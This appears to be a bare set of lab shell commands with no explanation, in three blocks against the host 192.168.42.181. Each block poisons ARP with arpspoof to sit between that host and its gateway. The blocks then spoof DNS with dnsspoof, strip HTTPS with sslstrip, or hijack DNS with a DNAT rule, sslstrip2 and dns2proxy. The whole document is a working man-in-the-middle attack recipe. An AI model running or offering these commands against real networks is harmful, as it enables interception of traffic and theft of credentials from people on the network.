sudo arpspoof -i enp0s8 -t 192.168.42.181 -r 192.168.42.1
sudo iptables -A FORWARD  -s 192.168.42.181 -p udp --dport 53 -j DROP
sudo dnsspoof -i enp0s8
 
 
sudo arpspoof -i enp0s8 -t 192.168.42.181 -r 192.168.42.1
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo sslstrip -l 8080 -a
 
sudo arpspoof -i enp0s8 -t 192.168.42.181 -r 192.168.42.1
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -i enp0s8 -j DNAT --to 192.168.42.100
sudo sslstrip2 -l 8080
sudo dns2proxy
